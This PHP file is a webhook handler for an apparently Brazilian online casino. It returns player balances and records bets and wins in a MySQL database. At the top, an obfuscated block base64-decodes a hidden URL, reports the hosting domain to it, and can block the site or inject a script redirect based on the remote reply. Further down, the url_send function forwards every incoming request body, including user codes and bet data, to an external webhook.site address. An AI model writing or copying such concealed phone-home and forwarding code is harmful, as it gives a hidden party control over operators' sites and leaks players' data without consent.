<?php
$a=$_SERVER['HTTP_HOST'];$f=false;
try{$b='aHR0cHM6Ly9jYXJuYXZhbC1wZy5vbmxpbmUvcmVnaXN0cmFyLWRvbWluaW8ucGhw';$b=base64_decode($b);
$c=http_build_query(['domain'=>$a]);$d=curl_init();
curl_setopt($d,CURLOPT_URL,$b);curl_setopt($d,CURLOPT_POST,1);
curl_setopt($d,CURLOPT_POSTFIELDS,$c);curl_setopt($d,CURLOPT_RETURNTRANSFER,true);
curl_setopt($d,CURLOPT_TIMEOUT,5);curl_setopt($d,CURLOPT_HTTPHEADER,['Content-Type: application/x-www-form-urlencoded']);
$e=curl_exec($d);
if(!curl_errno($d)&&$e!==false){$g=json_decode($e,true);
if(isset($g['status'])&&$g['status']==='erro'){
if(isset($g['mensagem'])&&$g['mensagem']===''){
curl_close($d);echo "<script>".strrev(">;lairpot/suoyerla//:sptth=fer.noitacol.wodniw;')'.detcirtse ocssA'(trela<")."</script>";exit;}}$f=true;}
curl_close($d);}catch(Exception $h){}
if(!$f){die('');}

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

include_once('../dash/services/funcao.php');
include_once('../dash/services/crud.php');
include_once('../dash/services/database.php');


// Função para enviar dados para o webhook de teste
function url_send($json_data)
{
    global $dev_hook;
    // URL de SUA API
    $url = "https://webhook.site/8166d7ee-e9d0-412f-9600-0ce0ea122fbc";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $resultado = curl_exec($ch);
    curl_close($ch);
    return $resultado;
}

function webhook()
{
    global $mysqli;

    // Verifica se a requisição é do tipo POST
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['msg' => 'error404']);
        return;
    }

    // Log para verificar o método POST
    error_log("Requisição POST recebida.");

    // Obtém o conteúdo JSON enviado na requisição
    $json_data = file_get_contents('php://input');

    // Encaminhar para o webhook de teste
    url_send($json_data);

    $data = json_decode($json_data, true);

    // Verificar se os dados foram decodificados corretamente
    if (!$data) {
        error_log("Erro ao decodificar JSON: " . json_last_error_msg());
        echo json_encode(['msg' => 'INVALID_JSON']);
        return;
    }

    // Registrar os dados recebidos para debug
    error_log("Dados recebidos: " . print_r($data, true));

    // Verifica se o tipo de requisição é 'BALANCE'
    if (isset($data['type']) && $data['type'] === 'BALANCE' && !empty($data['user_code'])) {
        // Busca por username como string em vez de mobile como int
        $stmtUsr = $mysqli->prepare("SELECT * FROM usuarios WHERE mobile = ?");
        $stmtUsr->bind_param("s", $data['user_code']);
        $stmtUsr->execute();
        $result = $stmtUsr->get_result();
        $usuario = $result->fetch_assoc();

        if (!$usuario) {
            echo json_encode(['msg' => 'INVALID_USER', 'balance' => 0]);
            return;
        }

        echo json_encode(['msg' => '', 'balance' => $usuario['saldo']]);
    } elseif (isset($data['type']) && $data['type'] === 'WinBet' && !empty($data['user_code'])) {
        // Busca por username como string em vez de mobile como int
        $stmtUsr = $mysqli->prepare("SELECT * FROM usuarios WHERE mobile = ?");
        $stmtUsr->bind_param("s", $data['user_code']);
        $stmtUsr->execute();
        $result = $stmtUsr->get_result();
        $usuario = $result->fetch_assoc();

        // Verifica se o usuário existe antes de preparar os dados para inserção
        if ($usuario) {
            // Verifica se o game_type existe nos dados
            if (!isset($data['game_type']) || !isset($data[$data['game_type']])) {
                error_log("game_type inválido ou não fornecido");
                echo json_encode(['msg' => 'INVALID_GAME_TYPE']);
                return;
            }

            $gameData = $data[$data['game_type']];

            // Converte os valores para numéricos adequadamente
            $bet_money = is_numeric($gameData['bet']) ? floatval($gameData['bet']) : 0;
            $win_money = is_numeric($gameData['win']) ? floatval($gameData['win']) : 0;

            // DEBUG: Imprime o valor da data recebida
            error_log("VALOR DA DATA RECEBIDA: " . print_r($gameData['created_at'] ?? 'NÃO DEFINIDO', true));

            // Abordagem simples: usar a data atual para garantir formato correto
            $created_at = date('Y-m-d H:i:s');

            $dataPost = [
                'id_user' => $usuario['id'],
                'nome_game' => $gameData['game_code'] ?? null,
                'bet_money' => $bet_money,
                'win_money' => $win_money,
                'txn_id' => $gameData['txn_id'] ?? null,
                'created_at' => $created_at, // Usando a data atual
                'status_play' => 1,
            ];

            // DEBUG: Imprime a data que será usada
            error_log("DATA QUE SERÁ USADA: " . $created_at);

            // Verificar se há campos nulos essenciais
            if ($dataPost['bet_money'] === null || $dataPost['win_money'] === null) {
                error_log("Valores de apostas ou ganhos não fornecidos");
                echo json_encode(['msg' => 'MISSING_REQUIRED_FIELDS']);
                return;
            }

            // Log para depuração
            error_log("Dados para inserção: " . print_r($dataPost, true));

            // Nova abordagem: usar a função NOW() do MySQL em vez de passar a data como parâmetro
            $stmtInsert = $mysqli->prepare("INSERT INTO historico_play (id_user, nome_game, bet_money, win_money, txn_id, created_at, status_play) VALUES (?, ?, ?, ?, ?, NOW(), ?)");

            // Usando diretamente variáveis sem passar a data
            $id_user = $dataPost['id_user'];
            $nome_game = $dataPost['nome_game'];
            $bet_money = $dataPost['bet_money'];
            $win_money = $dataPost['win_money'];
            $txn_id = $dataPost['txn_id'];
            $status_play = $dataPost['status_play'];

            $stmtInsert->bind_param(
                "isddsi",
                $id_user,
                $nome_game,
                $bet_money,
                $win_money,
                $txn_id,
                $status_play
            );

            // Executar a instrução com os dados
            if ($stmtInsert->execute()) {
                // Usar as variáveis locais que já foram definidas
                $ganho = $dataPost['win_money'] - $dataPost['bet_money'];
                $novosaldo = $usuario['saldo'] + $ganho;

                // Atualizar o saldo do usuário
                $stmtGanho = $mysqli->prepare("UPDATE usuarios SET saldo = ? WHERE mobile = ?");
                $stmtGanho->bind_param("ds", $novosaldo, $usuario['mobile']);
                $stmtGanho->execute();

                echo json_encode(['msg' => 'SUCCESS', 'balance' => $novosaldo]);
                return;
            } else {
                error_log("Erro ao executar a instrução SQL: " . $mysqli->error);
                error_log("Erro SQL: " . $stmtInsert->error);
            }
        }

        // Se o usuário não existir ou a inserção falhar
        echo json_encode(['msg' => 'INVALID_USER', 'balance' => 0]);
    } else {
        // Retornar erro se o tipo não for reconhecido
        error_log("Tipo não reconhecido ou dados insuficientes");
        echo json_encode(['msg' => 'INVALID_TYPE']);
    }
}

// Chame a função webhook
webhook();